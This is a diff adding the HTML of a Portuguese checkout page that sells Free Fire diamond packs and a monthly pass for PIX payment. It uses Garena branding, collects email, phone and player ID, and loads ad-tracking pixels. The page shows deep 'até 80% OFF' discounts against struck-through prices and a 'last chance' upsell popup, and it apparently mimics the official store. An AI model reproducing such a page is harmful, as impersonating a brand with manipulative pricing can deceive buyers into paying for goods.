@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xnapb8mtfe");
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Finalizar Compra — Free Fire</title>
+<meta name="description" content="Finalize sua compra de diamantes Free Fire com PIX.">
+<link rel="icon" href="../images/favicon.ico" sizes="32x32">
+<link href="../css/all.min.css" rel="stylesheet">
+<link href="../css/bootstrap.min.css" rel="stylesheet">
+<link href="checkout.css" rel="stylesheet">
+
+<!-- LowTrack Pixel -->
+<script>
+  window.pixelId = "lt_px_a12f52fa71fd";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://lowtrack.com.br/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1579489380453079');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1579489380453079&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- PageView bootstrap -->
+<script src="../../js/pixel-bootstrap.js" defer></script>
+<!-- UTM Flow (persiste macros do Meta com pipes) -->
+<script src="../../js/utm-flow.js"></script>
+<!-- Helper único de UTMs (fallback chain UtmFlow → UtmHelper → URL) -->
+<script src="utm-shared.js"></script>
+<style>
+  .pay-banner {
+    width: 100%;
+    border-radius: 14px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+    margin: 0 0 18px;
+    background: #000;
+  }
+  .pay-banner img {
+    display: block;
+    width: 100%;
+    aspect-ratio: 1052 / 360;
+    object-fit: cover;
+  }
+  .up-tile {
+    display: grid;
+    grid-template-columns: 56px 1fr auto;
+    gap: 12px;
+    align-items: center;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 12px;
+    border: 1.5px solid var(--border-strong);
+    background: #ffffff;
+    cursor: pointer;
+    transition: border-color 200ms ease, transform 200ms ease, background 200ms ease;
+    width: 100%;
+    text-align: left;
+    font-family: inherit;
+    color: inherit;
+  }
+  .up-tile:hover { border-color: var(--green); background: var(--green-soft); }
+  .up-tile.active {
+    border-color: var(--green);
+    background: var(--green-soft);
+    box-shadow: 0 0 0 2px rgba(46, 168, 79, 0.15);
+  }
+  .up-tile img { width: 56px; height: 56px; border-radius: 8px; object-fit: cover; }
+  .up-tile .up-thumb { width: 56px; height: 56px; border-radius: 8px; }
+
+  /* === Thumbs gradient (substituem imagens estáticas dos pacotes diamante) === */
+  .up-thumb {
+    width: 56px; height: 56px; border-radius: 10px; flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--ff-body); font-weight: 800; font-size: 0.92rem;
+    color: #ffffff; letter-spacing: -0.01em;
+    box-shadow: inset 0 -2px 0 rgba(0, 0, 0, 0.12);
+    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.25);
+  }
+  .up-thumb-grad-grad1 { background: linear-gradient(135deg, #4facfe, #00c6ff); }
+  .up-thumb-grad-grad2 { background: linear-gradient(135deg, #6a5cff, #00b3a4); }
+  .up-thumb-grad-grad3 { background: linear-gradient(135deg, #b14cff, #ff4c9d); }
+  .up-thumb-grad-grad4 { background: linear-gradient(135deg, #ff7a18, #ff2d6f); }
+  .up-thumb-grad-grad5 { background: linear-gradient(135deg, #f5af19, #ff5e00); }
+  .upsell-thumb {
+    width: 56px; height: 56px; border-radius: 10px; flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--ff-body); font-weight: 800; font-size: 0.92rem;
+    color: #ffffff; letter-spacing: -0.01em;
+    box-shadow: inset 0 -2px 0 rgba(0, 0, 0, 0.12);
+    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.25);
+  }
+  .upsell-thumb-grad1 { background: linear-gradient(135deg, #4facfe, #00c6ff); }
+  .upsell-thumb-grad2 { background: linear-gradient(135deg, #6a5cff, #00b3a4); }
+  .upsell-thumb-grad3 { background: linear-gradient(135deg, #b14cff, #ff4c9d); }
+  .upsell-thumb-grad4 { background: linear-gradient(135deg, #ff7a18, #ff2d6f); }
+  .upsell-thumb-grad5 { background: linear-gradient(135deg, #ff4c9d, #ff7a18); }
+  .upsell-thumb-grad6 { background: linear-gradient(135deg, #f5af19, #ff5e00); }
+  .upsell-thumb i { font-size: 1.2rem; }
+
+  /* === ID-conta: confirmação === */
+  #player-id-confirm-wrap input[style*="display:none"] { display: none !important; }
+  #player-id-checkout:focus,
+  #player-id-confirm:focus {
+    border-color: var(--green) !important;
+    box-shadow: 0 0 0 3px rgba(46, 168, 79, 0.15);
+    outline: none;
+  }
+  .up-tile .up-info strong { display: block; font-size: 0.94rem; color: var(--ink); margin-bottom: 4px; font-weight: 700; }
+  .up-tile .up-prices { display: flex; align-items: center; gap: 6px; font-size: 0.8rem; }
+  .up-tile .up-prices s { opacity: 0.75; color: var(--muted); font-weight: 500; }
+  .up-tile .up-prices strong { color: var(--green-deep); font-weight: 800; font-size: 0.95rem; }
+  .up-tile .tick {
+    width: 26px; height: 26px; border-radius: 50%; border: 2px solid var(--border-strong);
+    display: flex; align-items: center; justify-content: center; color: transparent;
+    font-size: 14px; transition: all 200ms ease; flex-shrink: 0; background: #fff;
+  }
+  .up-tile.active .tick { background: var(--green); border-color: var(--green); color: #fff; }
+
+  /* === Popup Upsell (modal) — paleta clara do checkout === */
+  .upsell-overlay {
+    position: fixed; inset: 0; z-index: 200;
+    background: rgba(15, 18, 28, 0.55);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    overflow-y: auto;
+  }
+  .upsell-overlay.show { display: flex; animation: fadeIn 0.25s ease; }
+  .upsell-panel {
+    background: #ffffff;
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 22px 18px;
+    max-width: 440px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(15, 18, 28, 0.22);
+    animation: slideUp 0.32s cubic-bezier(0.4, 0, 0.2, 1);
+    max-height: calc(100vh - 32px);
+    overflow-y: auto;
+    position: relative;
+  }
+  .upsell-header {
+    text-align: center;
+    margin-bottom: 16px;
+  }
+  .upsell-header .tag {
+    display: inline-block;
+    background: #fff4dc;
+    color: #7a4a00;
+    font-size: 0.74rem;
+    font-weight: 800;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 5px 12px;
+    border-radius: 999px;
+    margin-bottom: 12px;
+    border: 1px solid #e8b760;
+  }
+  .upsell-header h2 {
+    margin: 0 0 6px;
+    font-size: 1.32rem;
+    font-weight: 800;
+    color: var(--ink);
+    line-height: 1.2;
+    letter-spacing: -0.01em;
+    font-family: var(--ff-body);
+    text-transform: none;
+    font-style: normal;
+  }
+  .upsell-header .anchor {
+    display: inline-block;
+    font-size: 0.95rem;
+    color: var(--ink-soft);
+    margin: 0;
+    line-height: 1.4;
+  }
+  .upsell-header .anchor s {
+    color: var(--muted);
+    text-decoration: line-through;
+    opacity: 0.7;
+  }
+  .upsell-header .anchor strong {
+    color: var(--orange-deep);
+    font-weight: 800;
+    font-size: 1.05rem;
+  }
+  .upsell-grid {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 10px;
+    margin: 14px 0;
+  }
+  @media (min-width: 720px) {
+    .upsell-grid {
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+    }
+  }
+  .upsell-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    text-align: left;
+    padding: 12px;
+    border: 1.5px solid var(--border, #e5e7eb);
+    border-radius: 12px;
+    background: var(--bg-soft, #ffffff);
+    cursor: pointer;
+    transition: border-color .15s ease, transform .1s ease, background .15s ease, box-shadow .2s ease;
+    width: 100%;
+    font-family: inherit;
+    color: inherit;
+    box-shadow: 0 1px 2px rgba(15, 18, 28, 0.04);
+    min-width: 0;
+    gap: 8px;
+  }
+  .upsell-item:hover {
+    border-color: var(--primary, #ff6a00);
+    background: rgba(255, 106, 0, 0.04);
+    transform: translateY(-1px);
+  }
+  .upsell-item.active {
+    border-color: var(--primary, #ff6a00);
+    background: rgba(255, 106, 0, 0.06);
+    box-shadow: 0 0 0 2px rgba(255, 106, 0, 0.18);
+  }
+  .upsell-item-info {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    min-width: 0;
+    flex: 1;
+  }
+  .upsell-item-info strong {
+    font-size: 0.92rem;
+    color: var(--ink, #111);
+    font-weight: 700;
+    line-height: 1.2;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .upsell-item-info span {
+    font-size: 0.74rem;
+    color: var(--ink-soft, #6b7280);
+    line-height: 1.2;
+  }
+  .upsell-item-price {
+    text-align: right;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    min-width: 78px;
+    flex-shrink: 0;
+  }
+  .upsell-item-price .old {
+    font-size: 0.7rem;
+    color: #9ca3af;
+    text-decoration: line-through;
+  }
+  .upsell-item-price strong {
+    font-size: 0.98rem;
+    color: var(--primary, #ff6a00);
+    font-weight: 800;
+  }
+  /* bolinha removida — o card inteiro já é a área de seleção */
+  .upsell-item .check-tick { display: none; }
+  .upsell-actions {
+    display: grid;
+    gap: 10px;
+    margin-top: 6px;
+  }
+  .btn-upsell-accept {
+    width: 100%;
+    padding: 16px;
+    background: var(--green);
+    color: #ffffff;
+    border: 0;
+    border-radius: 12px;
+    font-family: var(--ff-body);
+    font-size: 1.02rem;
+    font-weight: 700;
+    letter-spacing: 0.01em;
+    text-transform: none;
+    font-style: normal;
+    cursor: pointer;
+    box-shadow: 0 8px 22px rgba(46, 168, 79, 0.28), inset 0 -2px 0 rgba(0, 0, 0, 0.08);
+    transition: transform 150ms ease, box-shadow 150ms ease, background 150ms ease;
+  }
+  .btn-upsell-accept:hover {
+    background: var(--green-deep);
+    transform: translateY(-1px);
+    box-shadow: 0 10px 28px rgba(46, 168, 79, 0.35);
+  }
+  .btn-upsell-decline {
+    width: 100%;
+    padding: 12px;
+    background: transparent;
+    color: var(--muted);
+    border: 0;
+    font-size: 0.88rem;
+    font-weight: 600;
+    cursor: pointer;
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    font-family: inherit;
+  }
+  .btn-upsell-decline:hover { color: var(--ink); }
+  .upsell-summary {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 14px;
+    margin: 8px 0 14px;
+    font-size: 0.92rem;
+    color: var(--ink-soft);
+    font-weight: 600;
+    background: var(--bg-soft);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+  }
+  .upsell-summary strong {
+    color: var(--green-deep);
+    font-weight: 800;
+  }
+  .upsell-mini {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 0;
+    border-top: 1px dashed var(--border);
+    margin-top: 6px;
+    font-size: 0.86rem;
+    color: var(--ink-soft);
+  }
+  .upsell-mini strong { color: var(--green-deep); font-weight: 800; }
+
+  /* === Order bumps em grid horizontal (clean, sem imagem/gradiente) === */
+  .up-tile-grid {
+    display: grid;
+    grid-template-columns: minmax(0, 1fr);
+    gap: 10px;
+  }
+  @media (min-width: 480px) {
+    .up-tile-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  }
+  @media (min-width: 720px) {
+    .up-tile-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+  }
+  .up-tile-grid .up-tile {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    text-align: left;
+    padding: 14px 12px;
+    margin: 0;
+    border: 1.5px solid var(--border-strong, #e5e7eb);
+    border-radius: 12px;
+    background: var(--bg-soft, #fff);
+    cursor: pointer;
+    gap: 12px;
+    min-width: 0;
+    overflow: hidden;
+    transition: border-color .15s ease, transform .1s ease, background .15s ease;
+  }
+  .up-tile-grid .up-tile:hover { border-color: var(--green, #ff6a00); }
+  .up-tile-grid .up-tile.active {
+    border-color: var(--green, #ff6a00);
+    background: var(--green-soft, rgba(46,168,79,0.08));
+  }
+  .up-tile-info {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    min-width: 0;
+    flex: 1 1 auto;
+  }
+  .up-tile-info strong {
+    font-size: 0.95rem;
+    color: var(--ink, #111);
+    font-weight: 700;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    line-height: 1.2;
+  }
+  .up-tile-info span {
+    font-size: 0.78rem;
+    color: var(--ink-soft, #6b7280);
+    word-break: normal;
+  }
+  .up-tile-price {
+    text-align: right;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    flex: 0 0 auto;
+    min-width: 70px;
+  }
+  .up-tile-price .old {
+    font-size: 0.72rem;
+    color: #9ca3af;
+    text-decoration: line-through;
+    white-space: nowrap;
+  }
+  .up-tile-price strong {
+    font-size: 1rem;
+    color: var(--green-deep, #ff6a00);
+    font-weight: 800;
+    white-space: nowrap;
+  }
+
+  /* === Pop-up diamantes (mesmas regras) === */
+  .upsell-grid {
+    display: grid;
+    grid-template-columns: minmax(0, 1fr);
+    gap: 10px;
+  }
+  @media (min-width: 480px) {
+    .upsell-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  }
+  @media (min-width: 720px) {
+    .upsell-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+  }
+  .upsell-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    text-align: left;
+    padding: 14px 12px;
+    border: 1.5px solid var(--border-strong, #e5e7eb);
+    border-radius: 12px;
+    background: var(--bg-soft, #fff);
+    cursor: pointer;
+    gap: 12px;
+    min-width: 0;
+    overflow: hidden;
+    transition: border-color .15s ease, transform .1s ease, background .15s ease;
+  }
+  .upsell-item:hover { border-color: var(--green, #ff6a00); }
+  .upsell-item.active {
+    border-color: var(--green, #ff6a00);
+    background: var(--green-soft, rgba(46,168,79,0.08));
+  }
+  .upsell-item-info {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    min-width: 0;
+    flex: 1 1 auto;
+  }
+  .upsell-item-info strong {
+    font-size: 0.92rem;
+    color: var(--ink, #111);
+    font-weight: 700;
+    line-height: 1.2;
+    overflow-wrap: anywhere;
+  }
+  .upsell-item-info span {
+    font-size: 0.74rem;
+    color: var(--ink-soft, #6b7280);
+  }
+  .upsell-item-price {
+    text-align: right;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    flex: 0 0 auto;
+    min-width: 64px;
+  }
+  .upsell-item-price .old {
+    font-size: 0.7rem;
+    color: #9ca3af;
+    text-decoration: line-through;
+    white-space: nowrap;
+  }
+  .upsell-item-price strong {
+    font-size: 0.95rem;
+    color: var(--green-deep, #ff6a00);
+    font-weight: 800;
+    white-space: nowrap;
+  }
+</style>
+</head>
+<body>
+<header class="pay-header">
+  <div class="brand">
+    <img src="../images/logo_mobile.svg" alt="Garena">
+    <span>Free Fire 9 Anos</span>
+  </div>
+  <div class="breadcrumb">
+    Etapa <span class="step active">1</span><span class="step">2</span>
+  </div>
+</header>
+
+<main class="pay-main">
+  <h2 style="margin:0 0 14px;font-size:1.25rem;font-weight:700;color:var(--ink);letter-spacing:-0.01em;">Confirme seu pedido</h2>
+
+  <div class="pay-banner">
+    <img src="images/promo-banner.jpeg" alt="Promoção 9 anos Free Fire" loading="lazy">
+  </div>
+
+  <div class="card">
+    <p class="section-title">Resumo do pedido</p>
+    <div id="cart-list"></div>
+    <div class="cart-total">
+      <span>Total</span>
+      <strong id="cart-total">R$ 0,00</strong>
+    </div>
+  </div>
+
+  <div id="email-form" class="card" autocomplete="on">
+    <p class="section-title">Seus dados pra continuar</p>
+    <div class="form-group">
+      <label for="email">Seu e-mail</label>
+      <input type="email" id="email" name="email" inputmode="email" autocomplete="email" placeholder="seu@email.com">
+    </div>
+    <div class="form-group">
+      <label for="phone">Seu telefone (com DDD)</label>
+      <input type="tel" id="phone" name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" maxlength="16">
+    </div>
+
+    <!-- === ID da conta Free Fire que vai receber os diamantes === -->
+    <div class="form-group" id="player-id-group">
+      <label for="player-id-checkout">
+        ID da conta que vai receber
+        <span style="color:var(--muted);font-weight:500;font-size:0.78rem;">(apenas números)</span>
+      </label>
+      <input
+        type="text"
+        id="player-id-checkout"
+        name="player-id-checkout"
+        inputmode="numeric"
+        autocomplete="off"
+        placeholder="Ex: 123456789"
+        maxlength="20"
+        pattern="[0-9]{6,20}"
+        style="font-family:ui-monospace,Menlo,monospace;letter-spacing:0.06em;font-weight:700;text-align:center;">
+      <div id="player-id-confirm-wrap" style="display:none;margin-top:8px;">
+        <label for="player-id-confirm" style="font-size:0.78rem;color:var(--ink-soft);">
+          Digite o ID novamente pra confirmar
+        </label>
+        <input
+          type="text"
+          id="player-id-confirm"
+          name="player-id-confirm"
+          inputmode="numeric"
+          autocomplete="off"
+          placeholder="Repita o ID"
+          maxlength="20"
+          style="font-family:ui-monospace,Menlo,monospace;letter-spacing:0.06em;font-weight:700;text-align:center;">
+        <div id="player-id-error" style="display:none;color:#c92a2a;font-size:0.78rem;margin-top:6px;font-weight:600;"></div>
+      </div>
+    </div>
+
+    <div id="form-error" class="form-error"></div>
+    <p style="font-size:11px;color:var(--muted);margin:0 0 0;text-align:center;">
+      <span class="lgpd-text" style="font-size:0.6rem;"><span class="l-br">L</span><span class="l-gd">G</span><span class="l-pr">PD</span></span> · Dados protegidos conforme a lei
+    </p>
+  </div>
+
+  <div class="card promo-9anos" id="upsell-section" hidden>
+    <p class="section-title">Bônus — promoção 9 Anos</p>
+    <p style="font-size:0.82rem;color:var(--ink-soft);margin:0 0 10px;line-height:1.4;">
+      Toque pra adicionar pelo preço promocional.
+    </p>
+
+    <div class="up-tile-grid">
+      <button type="button" class="up-tile" data-id="up-d100" data-name="Pacote Diamantes 100 + 30 bônus" data-price="2.90">
+        <div class="up-tile-info">
+          <strong>Pacote Diamantes 100</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="up-tile-price">
+          <span class="old">R$ 4,90</span>
+          <strong>R$ 2,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="up-tile" data-id="up-d310" data-name="Pacote Diamantes 310 + 30 bônus" data-price="5.90">
+        <div class="up-tile-info">
+          <strong>Pacote Diamantes 310</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="up-tile-price">
+          <span class="old">R$ 9,90</span>
+          <strong>R$ 5,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="up-tile" data-id="up-d1080" data-name="Pacote Diamantes 1.080 + 30 bônus" data-price="11.90">
+        <div class="up-tile-info">
+          <strong>Pacote Diamantes 1.080</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="up-tile-price">
+          <span class="old">R$ 19,90</span>
+          <strong>R$ 11,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="up-tile" data-id="up-d2180" data-name="Pacote Diamantes 2.180 + 30 bônus" data-price="19.90">
+        <div class="up-tile-info">
+          <strong>Pacote Diamantes 2.180</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="up-tile-price">
+          <span class="old">R$ 29,90</span>
+          <strong>R$ 19,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="up-tile" data-id="up-pass" data-name="Passe Mensal Free Fire (30 dias)" data-price="9.90">
+        <div class="up-tile-info">
+          <strong>Passe Mensal — 30 dias</strong>
+          <span>Diárias + missões</span>
+        </div>
+        <div class="up-tile-price">
+          <span class="old">R$ 14,90</span>
+          <strong>R$ 9,90</strong>
+        </div>
+      </button>
+    </div>
+  </div>
+
+  <div id="player-id-display" style="display:none;margin-top:14px;padding:14px;border:1px solid var(--border, #e5e7eb);border-radius:10px;background:var(--bg-soft, #f7f7f8);">
+    <div style="font-size:0.78rem;color:var(--ink-soft, #555);margin-bottom:4px;">
+      Confirme o ID da conta que vai receber a recarga:
+    </div>
+    <div style="font-weight:600;font-size:0.95rem;color:var(--ink, #111);font-family:ui-monospace,Menlo,monospace;letter-spacing:0.06em;" id="player-id-display-value">
+      (digite sua ID acima)
+    </div>
+  </div>
+
+  <div id="submit-wrap">
+    <button type="button" id="submit-btn" class="btn-primary is-disabled" data-disabled="true" aria-disabled="true">
+      <i class="fa-solid fa-lock"></i> <span id="submit-label">Preencha os dados pra continuar</span>
+    </button>
+  </div>
+
+  <div data-trust-mount></div>
+
+  <div class="trust">
+    <i class="fa-solid fa-shield-halved"></i>
+    <span>Pagamento 100% seguro via PIX · Seus dados são protegidos</span>
+  </div>
+</main>
+
+<footer class="pay-footer">
+  <div class="total-line">
+    <span>Total a pagar</span>
+    <strong id="cart-total-footer">R$ 0,00</strong>
+  </div>
+</footer>
+
+<!-- === POPUP UPSELL === -->
+<div class="upsell-overlay" id="upsell-overlay" aria-hidden="true">
+  <div class="upsell-panel" role="dialog" aria-modal="true" aria-labelledby="upsell-title">
+    <div class="upsell-header">
+      <span class="tag">🎁 Última chance</span>
+      <h2 id="upsell-title">Adicione + diamantes e obtenha mais desconto</h2>
+      <p class="anchor">Pacotes extras com <strong>até 80% OFF</strong> antes de gerar o PIX.</p>
+    </div>
+
+    <div class="upsell-grid" id="upsell-list">
+      <button type="button" class="upsell-item" data-id="up-pop-d210" data-name="Pacote Diamantes 210 + 30 bônus" data-price="4.90">
+        <div class="upsell-item-info">
+          <strong>Pacote 210</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="upsell-item-price">
+          <span class="old">R$ 7,90</span>
+          <strong>R$ 4,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="upsell-item" data-id="up-pop-d560" data-name="Pacote Diamantes 560 + 30 bônus" data-price="7.90">
+        <div class="upsell-item-info">
+          <strong>Pacote 560</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="upsell-item-price">
+          <span class="old">R$ 12,90</span>
+          <strong>R$ 7,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="upsell-item" data-id="up-pop-d1080" data-name="Pacote Diamantes 1.080 + 30 bônus" data-price="12.90">
+        <div class="upsell-item-info">
+          <strong>Pacote 1.080</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="upsell-item-price">
+          <span class="old">R$ 19,90</span>
+          <strong>R$ 12,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="upsell-item" data-id="up-pop-d2180" data-name="Pacote Diamantes 2.180 + 30 bônus" data-price="19.90">
+        <div class="upsell-item-info">
+          <strong>Pacote 2.180</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="upsell-item-price">
+          <span class="old">R$ 29,90</span>
+          <strong>R$ 19,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="upsell-item" data-id="up-pop-d3680" data-name="Pacote Diamantes 3.680 + 30 bônus" data-price="24.90">
+        <div class="upsell-item-info">
+          <strong>Pacote 3.680</strong>
+          <span>+30 bônus</span>
+        </div>
+        <div class="upsell-item-price">
+          <span class="old">R$ 34,90</span>
+          <strong>R$ 24,90</strong>
+        </div>
+      </button>
+
+      <button type="button" class="upsell-item" data-id="up-pop-pass" data-name="Passe Mensal Free Fire (30 dias)" data-price="19.90">
+        <div class="upsell-item-info">
+          <strong>Passe Mensal</strong>
+          <span>30 dias</span>
+        </div>
+        <div class="upsell-item-price">
+          <span class="old">R$ 39,90</span>
+          <strong>R$ 19,90</strong>
+        </div>
+      </button>
+    </div>
+
+    <div class="upsell-summary">
+      <span>Selecionados:</span>
+      <strong id="upsell-sum">R$ 0,00</strong>
+    </div>
+
+    <div class="upsell-actions">
+      <button type="button" id="upsell-accept" class="btn-upsell-accept">
+        <i class="fa-solid fa-check"></i> Adicionar e continuar
+      </button>
+      <button type="button" id="upsell-decline" class="btn-upsell-decline">
+        Não, obrigado
+      </button>
+    </div>
+  </div>
+</div>
+
+<script src="utm-helper.js"></script>
+<script src="customer.js"></script>
+<script src="checkout.js"></script>
+<script src="trust.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const cart = CheckoutParte1.loadCart();
+    if (!cart) {
+      // Volta pro /ff/ mantendo UTMs via helper único (UtmShared — fallbacks UtmFlow > UtmHelper > URL).
+      const dest = window.UtmShared && typeof window.UtmShared.appendToUrl === 'function'
+        ? window.UtmShared.appendToUrl('../../index.html')
+        : ('../../index.html' + (window.location.search || ''));
+      window.location.replace(dest);
+      return;
+    }
+    CheckoutParte1.renderSummary(cart);
+    CheckoutParte1.bindUpsells(cart);
+    const footerTotal = document.getElementById('cart-total-footer');
+    if (footerTotal) footerTotal.textContent = document.getElementById('cart-total').textContent;
+    CheckoutParte1.bindForm();
+
+    // === ID da conta Free Fire + confirmação ===
+    const idInput = document.getElementById('player-id-checkout');
+    const idConfirmWrap = document.getElementById('player-id-confirm-wrap');
+    const idConfirm = document.getElementById('player-id-confirm');
+    const idError = document.getElementById('player-id-error');
+    const idDisplayBlock = document.getElementById('player-id-display');
+    const idDisplayValue = document.getElementById('player-id-display-value');
+
+    function updateIdDisplay() {
+      if (!idDisplayBlock || !idDisplayValue || !idInput) return;
+      const v = onlyDigits(idInput.value);
+      if (v.length > 0) {
+        idDisplayBlock.style.display = 'block';
+        idDisplayValue.textContent = v;
+      } else {
+        idDisplayBlock.style.display = 'none';
+        idDisplayValue.textContent = '(digite sua ID acima)';
+      }
+    }
+
+    // Pré-preenche com o ID que veio da loja (logado.html grava em sessionStorage)
+    const PRE_ID_KEY = 'ff:playerId';
+    let initialId = '';
+    try { initialId = (sessionStorage.getItem(PRE_ID_KEY) || '').replace(/\D/g, '').slice(0, 20); } catch {}
+    if (initialId && idInput && !idInput.value) idInput.value = initialId;
+
+    const PLAYER_ID_KEY = 'ff:playerIdConfirmed';
+
+    function onlyDigits(s) { return String(s || '').replace(/\D/g, '').slice(0, 20); }
+
+    function validateIdShape(id) {
+      const n = onlyDigits(id);
+      if (n.length < 6 || n.length > 20) return false;
+      // Não aceita tudo zeros (placeholder óbvio)
+      if (/^0+$/.test(n)) return false;
+      return true;
+    }
+
+    function showIdError(msg) {
+      if (!idError) return;
+      idError.textContent = msg;
+      idError.style.display = 'block';
+    }
+    function hideIdError() {
+      if (!idError) return;
+      idError.textContent = '';
+      idError.style.display = 'none';
+    }
+
+    function checkConfirmNeeded() {
+      if (!idInput || !idConfirmWrap) return;
+      const v = onlyDigits(idInput.value);
+      if (v.length >= 6 && validateIdShape(v)) {
+        idConfirmWrap.style.display = 'block';
+      } else {
+        idConfirmWrap.style.display = 'none';
+        if (idConfirm) idConfirm.value = '';
+        hideIdError();
+      }
+    }
+
+    function maybeSaveConfirmed() {
+      if (!idInput || !idConfirm) return false;
+      const a = onlyDigits(idInput.value);
+      const b = onlyDigits(idConfirm.value);
+      if (!validateIdShape(a)) return false;
+      if (a !== b) {
+        showIdError('Os IDs não conferem. Digite o mesmo ID nos dois campos.');
+        return false;
+      }
+      hideIdError();
+      try { sessionStorage.setItem(PLAYER_ID_KEY, a); } catch {}
+      return true;
+    }
+
+    // Garante que checkConfirmNeeded rode quando CheckoutParte1.bindForm revela o botão
+    // (porque o botão só destrava depois de email + telefone OK)
+    function tryAutoCheck() {
+      if (idInput && idInput.value.length > 0) checkConfirmNeeded();
+    }
+    setTimeout(tryAutoCheck, 200);
+    setTimeout(tryAutoCheck, 800);
+
+    if (idInput) {
+      idInput.addEventListener('input', () => {
+        idInput.value = onlyDigits(idInput.value);
+        hideIdError();
+        updateIdDisplay();
+        checkConfirmNeeded();
+      });
+      // Atualiza display se valor pré-preenchido
+      updateIdDisplay();
+    }
+    if (idConfirm) {
+      idConfirm.addEventListener('input', () => {
+        idConfirm.value = onlyDigits(idConfirm.value);
+        // Validação em tempo real: mostra se IDs batem conforme o usuário digita
+        const a = onlyDigits(idInput.value);
+        const b = onlyDigits(idConfirm.value);
+        if (b.length === 0) {
+          hideIdError();
+          idConfirm.style.borderColor = '';
+          idConfirm.style.boxShadow = '';
+        } else if (b.length >= 6 && a === b) {
+          hideIdError();
+          idConfirm.style.borderColor = 'var(--green, #2ea84f)';
+          idConfirm.style.boxShadow = '0 0 0 3px rgba(46, 168, 79, 0.15)';
+        } else if (b.length >= a.length || b.length >= 6) {
+          // Só mostra erro quando já digitou o suficiente pra comparar
+          if (a !== b) {
+            showIdError('Os IDs não conferem. Digite o mesmo ID nos dois campos.');
+            idConfirm.style.borderColor = '#c92a2a';
+            idConfirm.style.boxShadow = '0 0 0 3px rgba(201, 42, 42, 0.12)';
+          }
+        } else {
+          hideIdError();
+          idConfirm.style.borderColor = '';
+          idConfirm.style.boxShadow = '';
+        }
+      });
+    }
+
+    // Hook ANTES do submit: bloqueia se ID não foi confirmado.
+    // O CheckoutParte1.bindForm amarra o click no submit; interceptamos via
+    // listener capture que valida antes do handler original.
+    const submitBtn = document.getElementById('submit-btn');
+    if (submitBtn) {
+      submitBtn.addEventListener('click', function gate(e) {
+        if (!idInput || !idConfirm) return;
+        const a = onlyDigits(idInput.value);
+        const b = onlyDigits(idConfirm.value);
